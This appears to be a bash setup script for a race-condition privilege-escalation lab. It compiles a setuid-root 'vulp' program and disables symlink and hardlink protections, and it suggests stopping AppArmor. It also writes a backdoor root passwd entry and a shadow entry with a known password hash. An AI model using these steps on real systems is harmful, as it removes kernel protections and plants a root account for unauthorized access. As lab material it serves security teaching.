#!/bin/bash

COMPILE=0

# Parsear argumentos
while getopts "p" opt; do
  case $opt in
    p)
      COMPILE=1
      ;;
    *)
      echo "Uso: $0 [-p]"
      exit 1
      ;;
  esac
done

if [ ! -f "vulp.c" ]; then
    echo "ERROR: vulp.c not found"
    exit 1
fi

if [ $COMPILE -eq 1 ]; then
    # Compilar vulp
    echo "[+] Compiling vulp..."
    gcc -o vulp vulp.c

    echo "[+] Setting up vulp as setuid root..."
    sudo chown root:root vulp
    sudo chmod u+s vulp

    # Verificar permisos y propietario de vulp
    echo "[+] Verifying vulp permissions:"
    ls -la vulp
    echo "# Debe mostrar: -rwsr-xr-x root root"

    # Compilar ataque
    echo "[+] Compiling attack program..."
    gcc -o attack attack.c
    if [ $? -ne 0 ]; then
        echo "ERROR: Failed to compile attack"
        exit 1
    fi
fi

# Backup
echo "[+] Creating backup..."
sudo cp /etc/passwd /etc/passwd.backup.$(date +%s)

# Mostrar estado inicial
echo "[+] Current end of /etc/passwd:"
tail -2 /etc/passwd
echo

# Verificar permisos en /tmp
echo "[+] Testing /tmp permissions..."
echo "test" > /tmp/test_file 2>/dev/null
if [ $? -eq 0 ]; then
    rm /tmp/test_file
    echo "OK - Can write to /tmp"
else
    echo "ERROR - Cannot write to /tmp"
    exit 1
fi

# Deshabilitar protected_symlinks
echo "[+] Disabling protected_symlinks..."
sudo sysctl -w fs.protected_symlinks=0
sudo sysctl -w fs.protected_hardlinks=0
# Verificar protecciones del sistema
echo "[+] Checking system protections..."
SYMLINK_PROTECTION=$(sysctl -n fs.protected_symlinks 2>/dev/null || echo "unknown")
echo "fs.protected_symlinks = $SYMLINK_PROTECTION"

# Verificar AppArmor
echo "[+] Checking AppArmor status..."
sudo aa-status
echo "# Si está activo y causa problemas:"
echo "sudo systemctl stop apparmor"

# Dar permisos de ejecución al script de ataque
echo "[+] Giving execution permissions to script_1_attack..."
chmod +x script_1_attack.sh

# Preparar entrada maliciosa
echo "[+] Creating evil_input.txt entry ..."
printf "evil:x:0:0:Evil_User:/root:/bin/bash\n" > evil_input.txt

echo "[+] All Setting up Now you can run the script_1_attack..."
# Crear entrada para /etc/shadow con contraseña "123"
# Generado con: mkpasswd -m sha-512 123
echo "[+] Creating evil_input_shadow.txt entry ..."
echo 'evil:$6$rounds=656000$LHK0rUuzpTIaa0tz$N8XkkCT3L1S8hJleZYVFKyzv0ErFfQ2iMzSpbaYQbcDKcY0oQ1xV1N8Q43JjfwGFf3kXFeuBOg9MRGk/8CRh6.:19000:0:99999:7:::' > evil_input_shadow.txt
